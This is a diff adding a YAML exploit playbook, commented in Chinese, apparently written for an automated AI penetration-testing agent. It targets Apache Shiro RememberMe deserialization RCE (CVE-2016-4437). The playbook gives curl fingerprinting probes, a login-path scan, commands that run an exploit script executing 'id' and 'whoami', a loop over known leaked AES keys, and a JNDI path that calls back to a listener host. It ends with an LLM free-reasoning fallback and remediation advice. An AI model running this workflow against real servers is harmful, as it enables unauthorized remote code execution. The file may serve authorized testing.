@@ -1,0 +1,170 @@
+# ═══════════════════════════════════════════════════════════
+# Apache Shiro RememberMe 反序列化 RCE
+#
+# 原理: Shiro 用硬编码 AES 密钥加密 RememberMe Cookie
+#       攻击者用已知密钥构造恶意序列化对象 → 服务端解密反序列化 → RCE
+# 关键变量: AES 密钥（默认 or 泄露）、可用的 gadget chain
+# ═══════════════════════════════════════════════════════════
+skill_id: shiro_rce
+name: "Apache Shiro RememberMe 反序列化 RCE"
+category: java_deserialization
+version: "1.0"
+
+principle: |
+  Apache Shiro 的 RememberMe 功能使用 AES-CBC 加密序列化的用户身份信息，
+  存储在 Cookie 中。漏洞根因是 1.2.4 及更早版本使用硬编码的 AES 密钥
+  （kPH+bIxk5D2deZiIxcaaaA==）。
+  
+  攻击流程:
+  1. 用已知密钥 + ysoserial gadget 生成恶意序列化 payload
+  2. AES-CBC 加密 → Base64 编码
+  3. 设置为 rememberMe Cookie 发送
+  4. 服务端解密 → 反序列化 → 触发 gadget chain → RCE
+  
+  检测方法:
+  - 发送无效 rememberMe Cookie，响应 Set-Cookie 中出现 rememberMe=deleteMe
+    说明 Shiro 存在（不一定有漏洞，但值得进一步测试）
+  
+  变量:
+  - AES 密钥: 默认密钥 or 常见泄露密钥（约 20 个常见密钥）
+  - Gadget chain: CommonsBeanutils1、CommonsCollections 系列、URLDNS 等
+    取决于目标 classpath 中有哪些库
+  - 加密模式: CBC（经典）或 GCM（1.4.2+）
+
+match:
+  rules:
+    - fingerprint_contains: ["shiro"]
+    - fingerprint_contains: ["rememberMe", "deleteMe"]
+    - evidence_contains: ["rememberMe=deleteMe"]
+    - evidence_contains: ["shiro"]
+    - cve_matches: ["CVE-2016-4437"]
+
+probes:
+  - id: confirm_shiro
+    description: "发送无效 rememberMe Cookie 确认 Shiro 框架"
+    command: |
+      curl -s -D - -o /dev/null {ENDPOINT} \
+        -H "Cookie: rememberMe=invalid_base64_token_test" \
+        --max-time 10
+    timeout: 15
+    parse_rules:
+      - if_contains: ["rememberMe=deleteMe"]
+        set: { shiro_confirmed: true }
+      - if_contains: ["Set-Cookie"]
+        set: { has_cookies: true }
+
+  - id: find_login_endpoint
+    description: "探测登录接口（Shiro 通常保护登录页面）"
+    depends_on: { shiro_confirmed: true }
+    steps:
+      - command: |
+          for path in /login /doLogin /auth /user/login /admin/login /api/login /signin ""; do
+            code=$(curl -s -o /dev/null -w "%{http_code}" {ENDPOINT}${path} --max-time 5 2>/dev/null)
+            if [ "$code" = "200" ] || [ "$code" = "302" ]; then
+              echo "LOGIN_FOUND:${path}:${code}"
+            fi
+          done
+        parse_rules:
+          - if_regex: "LOGIN_FOUND:([^:]+):(\\d+)"
+            set: { login_path_found: true }
+
+exploit_paths:
+  # ═══ 路径 A: 一键脚本（遍历密钥 + gadget）═══
+  - path_id: shiro_script
+    name: "shiro_exploit.py 一键利用"
+    priority: 1
+    principle: |
+      使用预置脚本自动遍历 15+ 常见密钥和多种 gadget chain，
+      发送 rememberMe Cookie，通过延迟/报错判断是否成功。
+      不需要回连，在目标本地执行命令。
+    conditions:
+      shiro_confirmed: true
+    steps:
+      - id: shiro_auto
+        description: "自动遍历密钥和 gadget chain 执行命令"
+        command: "python3 /opt/shiro_exploit.py {ENDPOINT} id"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["uid=", "SUCCESS", "gid="]
+        on_success: shiro_confirm
+        on_fail: shiro_manual_keys
+
+      - id: shiro_confirm
+        description: "确认用户身份"
+        command: "python3 /opt/shiro_exploit.py {ENDPOINT} whoami"
+        timeout: 120
+        success_criteria:
+          stdout_not_empty: true
+        on_success: conclude_success
+        evidence_capture:
+          current_user: stdout
+          shell_type: "rce_shiro_deserial"
+
+      - id: shiro_manual_keys
+        description: "用默认密钥手工构造 payload（脚本失败时兜底）"
+        command: |
+          python3 -c "
+          import subprocess, sys
+          keys = [
+              'kPH+bIxk5D2deZiIxcaaaA==',
+              '4AvVhmFLUs0KTA3Kprsdag==',
+              '3AvVhmFLUs0KTA3Kprsdag==',
+              'Z3VucwAAAAAAAAAAAAAAAA==',
+              'wGiHplamyXlVB11UXWol8g==',
+              'fCq+/xW488hMTCD+cmJ3aQ==',
+          ]
+          for key in keys:
+              r = subprocess.run(
+                  ['python3', '/opt/shiro_exploit.py', '{ENDPOINT}', 'id', '--key', key],
+                  capture_output=True, text=True, timeout=30
+              )
+              if 'uid=' in r.stdout:
+                  print(f'KEY_FOUND:{key}')
+                  print(r.stdout)
+                  sys.exit(0)
+          print('ALL_KEYS_FAILED')
+          "
+        timeout: 180
+        success_criteria:
+          stdout_contains_any: ["uid=", "KEY_FOUND"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_shiro_manual"
+
+  # ═══ 路径 B: JNDI + Shiro（需回连）═══
+  - path_id: shiro_jndi
+    name: "Shiro + JNDI 远程类加载"
+    priority: 2
+    principle: |
+      用 ysoserial 的 JNDI gadget 构造 payload，通过 Shiro 反序列化
+      触发 JNDI 查找。需要回连但 gadget chain 要求更低。
+    conditions:
+      shiro_confirmed: true
+      env.can_reverse: true
+    steps:
+      - id: shiro_jndi_exploit
+        description: "Shiro rememberMe + JNDI 利用"
+        command: "python3 /opt/shiro_exploit.py {ENDPOINT} id --mode jndi --lhost {LHOST}"
+        timeout: 120
+        success_criteria:
+          stdout_contains_any: ["uid=", "SUCCESS"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_shiro_jndi"
+
+  # ═══ 路径 C: LLM 兜底 ═══
+  - path_id: llm_freeform
+    name: "LLM 自由推理"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 5
+    conditions:
+      shiro_confirmed: true
+
+remediation: |
+  1. 升级 Shiro 至 1.6.0+ 并配置随机 AES 密钥
+  2. 不要使用默认密钥，在 shiro.ini 或 Spring 配置中设置强随机密钥
+  3. 升级 commons-beanutils、commons-collections 等依赖
+  4. 考虑禁用 rememberMe 功能或缩短有效期
